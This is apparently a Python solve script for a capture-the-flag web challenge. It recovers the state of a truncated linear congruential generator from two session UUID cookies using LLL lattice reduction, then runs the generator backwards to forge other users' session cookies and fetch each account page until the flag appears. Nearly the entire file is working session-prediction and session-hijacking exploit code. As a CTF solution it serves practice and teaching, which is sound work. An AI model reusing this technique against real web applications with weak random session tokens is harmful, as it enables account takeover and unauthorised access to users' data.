from sage.all import QQ
from sage.all import ZZ
from sage.all import matrix
from sage.all import vector
from requests import Session
from string import printable
from random import choices
import tqdm
from Crypto.Util.number import inverse
import re
import uuid

class RNG(): 
    def __init__(self , state):
        self.m = 2**72
        self.a = 0xdeedbeef
        self.b = 0xc
        self.x = state

    def next_state(self):
        self.x = (self.x * self.a + self.b) % self.m
        return self.x >> (72 - 8)

    def random(self, lenght):
        res = b""
        for i in range(lenght):
            res += bytes([self.next_state()])
        return res
    
    def inv_state(self):
        self.x = ((self.x - self.b) * inverse(self.a, self.m)) % self.m
        return self.x >> (72 - 8)

    def inv_random(self,lenght):
        res = b""
        for i in range(lenght):
            res += bytes([self.inv_state()])
        return res[::-1]

def attack(y, k, s, m, a, c):
    diff_bit_length = k - s
    delta = c % m
    y = vector(ZZ, y)
    for i in range(len(y)):
        y[i] = (y[i] << diff_bit_length) - delta
        delta = (a * delta + c) % m

    B = matrix(ZZ, len(y), len(y))
    B[0, 0] = m
    for i in range(1, len(y)):
        B[i, 0] = a ** i
        B[i, i] = -1

    B = B.LLL()
    b = B * y
    for i in range(len(b)):
        b[i] = round(QQ(b[i]) / m) * m - b[i]

    delta = c % m
    x = list(B.solve_right(b))
    for i, state in enumerate(x):
        x[i] = int(y[i] + state + delta)
        delta = (a * delta + c) % m
    return x

URL = "https://mario-snake.vkactf.ru/"
s = Session()

printable = printable[:63]

rand_gen = []
id = 0
for i in range(2):
    username = "".join(choices(printable , k=10))
    password = "".join(choices(printable , k=10))
    print(username , password)
    res = s.post(URL + "sign" , data={"username":username , "password":password})
    rand_gen.append(s.cookies["uuid"])
    id = int(res.url.split("/")[-2])
print(rand_gen)

state_mass = rand_gen[0].replace("-","") + rand_gen[1].replace("-","")[:8] 
orig_state_mass = [i for i in state_mass]
X_final = []
for i in tqdm.tqdm(range(0,256)):
    state_mass = orig_state_mass
    hex_i = hex(i)[2:].rjust(2, "0")
    state_mass[12] = hex_i[0]
    state_mass[16] = hex_i[1]
    state_mass = "".join(state_mass)
    state_mass = [int(state_mass[i:i+2],16) for i in range(0,len(state_mass),2)]
    x = attack(state_mass ,72 , 8 ,m=2**72,a=0xdeedbeef,c=0xc)
    RNGenerator = RNG(x[-5])
    rng_ = RNGenerator.random(16)
    uuid_ = uuid.UUID(bytes= rng_, version=4)
    if str(uuid_) == rand_gen[1]:
        print(i,x)
        X_final = x
        break
    
RNGenerator = RNG(X_final[-4])
rng_ = RNGenerator.inv_random(16)
uuid_ = uuid.UUID(bytes= rng_, version=4)
assert (str(uuid_) == rand_gen[0])
id -= 2
flag = ""
while id != 0:
    rng_ = RNGenerator.inv_random(16)
    uuid_ = uuid.UUID(bytes= rng_, version=4)
    print(str(uuid_),id)
    s.cookies.clear()
    res = s.get(URL+f"cabinet/{id}/",cookies = {"uuid":str(uuid_)})
    if res.url != URL+f"cabinet/{id}/":
        print(res.text)
        break
    if id == 1:
        flag = re.findall(r"vka{(.*)}" , res.text)
    id -= 1
print("Flag: vka{" + flag[0] + "}")